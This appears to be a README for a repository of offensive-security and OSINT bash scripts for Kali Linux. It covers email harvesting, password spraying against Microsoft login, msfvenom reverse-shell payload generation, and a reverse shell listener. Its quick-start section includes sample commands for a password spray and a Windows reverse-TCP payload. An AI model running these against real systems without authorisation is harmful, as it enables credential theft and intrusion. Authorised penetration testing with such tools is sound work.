# Bash Script Arsenal

A collection of offensive security / OSINT bash scripts for Kali Linux.

## 📁 Structure

```
Bash-Scripts/
├── email_harvester/       # Domain email harvesting + LinkedIn enum + JSON output
├── reconnaissance/        # Subdomain enum, recon, OSINT
├── vulnerability_scanning/  # Nuclei, Burp, ZAP, web vuln
├── web_scanning/         # Web assessment
├── network_scanning/     # Nmap, MySQL, ping sweeps
├── active_directory/     # AD assessment
├── automation/          # Metasploit automation
├── misc/                # Fuzzing, maintenance, AI tools
├── subdomain_takeover/  # DNS dangling record detection
├── ssl_tls_audit/       # Certificate chain + cipher + vuln audit
├── git_leak_scan/       # Secret/key scanning in git repos
├── api_fuzz/            # REST API fuzzing (SQLi, XSS, IDOR, SSTI, NoSQL)
├── cloud_enum/          # AWS/GCP/Azure cloud resource enumeration
├── password_spray/      # Multi-target password spray with lockout detection
├── payload_gen/         # MSFVenom wrapper with presets and encoders
└── shell_handler/       # Multi-listener reverse shell manager
```

## ⚠️ Disclaimer

All scripts are for **authorized, ethical security testing only**. Do not use against targets without explicit permission.

### Password spray notes

- Microsoft targets use the **ROPC** (resource owner password credentials) flow against `login.microsoftonline.com` with a well-known public client ID (Azure PowerShell). Many tenants disable ROPC; prefer lab tenants and your own app registration where required.
- **Slack webhooks never include plaintext passwords** — only target identity and outcome.
- Hits with passwords are written only to local files under the output directory; rotate any confirmed credentials immediately.

## 📧 Quick Start

```bash
# Email harvester
./email_harvester/email_harvester.sh example.com -d 1 -j -f staff

# Subdomain takeover
./subdomain_takeover/subdomain_takeover_check.sh example.com -j

# SSL/TLS audit
./ssl_tls_audit/ssl_tls_audit.sh example.com -p 443 -j

# Git leak scan
./git_leak_scan/git_leak_scan.sh https://github.com/user/repo -j

# API fuzzing
./api_fuzz/api_fuzz.sh https://api.example.com -m GET -a BearerToken -j

# Cloud enum (AWS/GCP/Azure)
./cloud_enum/cloud_enum.sh aws -j -r eu-west-1

# Password spray (Slack alerts redact passwords)
./password_spray/password_spray.sh targets.txt passwords.txt -w https://hooks.slack.com/... -t 5

# Payload generation
./payload_gen/payload_gen.sh windows tcp_rev exe 192.168.1.100 4444 -e shikata_ga_nai -i 3

# Shell handler
./shell_handler/shell_handler.sh start -l 4444 -p tcp
```

## 🔧 Core Requirements

- Kali Linux
- Core: `dnsenum`, `theHarvester`, `sublist3r`, `assetfinder`, `amass`, `gau`, `httpx`, `curl`, `jq`
- Optional: `h8mail`, `nuclei`, `nmap`, `nikto`, `zap`, `burp`, `msfvenom`, `awscli`, `gh`

## 📝 License

MIT — see individual scripts for authorship notes.
